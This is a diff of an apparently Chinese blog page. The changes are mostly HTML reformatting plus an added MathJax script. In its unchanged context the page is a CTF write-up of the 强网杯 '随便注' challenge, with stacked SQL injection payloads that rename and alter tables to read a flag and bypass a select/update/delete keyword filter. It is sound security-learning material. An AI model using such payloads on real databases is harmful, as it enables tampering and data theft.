@@ -374,8 +374,8 @@
                 <p>sql注入</p>
 <span id="more"></span>
 <p>学习出处：</p>
-<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/105389126">https://blog.csdn.net/weixin_45551083/article/details/105389126 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/105389126" >https://blog.csdn.net/weixin_45551083/article/details/105389126 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951" >https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure></div>
 <p>select/update/delete/drop/insert/where过滤</p>
 <p>无法使用union联合查询，使用堆叠注入</p>
@@ -387,19 +387,34 @@
 <p>?inject=1’ ;show columns from `1919810931114514`—+</p>
 <blockquote>
 <p>关于反引号：表名、字段、数据库名等标识符可用反引号 `  。<br>标识符也可以不使用反引号，但如果标识符包含特殊字符或保留字，则必须使用。</p>
-<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730092402760.png" alt="image-20200730092402760"></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730092402760.png"
+                      class="" title="image-20200730092402760"
+                >
 </blockquote>
 <p><strong>rename</strong></p>
 <p>rename <strong>tables</strong> tbl_name to new_tbl_name [, tbl_name2 to new_tbl_name2] …本语bai句用于对一个或多个表进行du重命名。</p>
 <p><strong>alter table</strong>s</p>
-<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730093600749.png" alt="image-20200730093600749"></p>
-<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730093702863.png" alt="image-20200730093702863"></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093600749.png"
+                      class="" title="image-20200730093600749"
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093702863.png"
+                      class="" title="image-20200730093702863"
+                >
 <p>?id=1’;rename tables`words` to `aaa`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);alter table`words` change `flag` `data` varchar(100)—+</p>
 <p>?id=1’ or 1=1—+</p>
 <p>得到flag</p>
 <h4 id="关于是否修改flag为data"><a href="#关于是否修改flag为data" class="headerlink" title="关于是否修改flag为data"></a>关于是否修改flag为data</h4><p>看了很多wp,发现不用修改列名也能得到flag</p>
 <p>或者直接把flag改为id也可以</p>
-<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951" >https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>在这条中得到了答案</p>
 <p>之前猜测的内部查询语句是</p>
 <p>select id,data from words where id=</p>
@@ -741,5 +756,20 @@
 
 
 
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
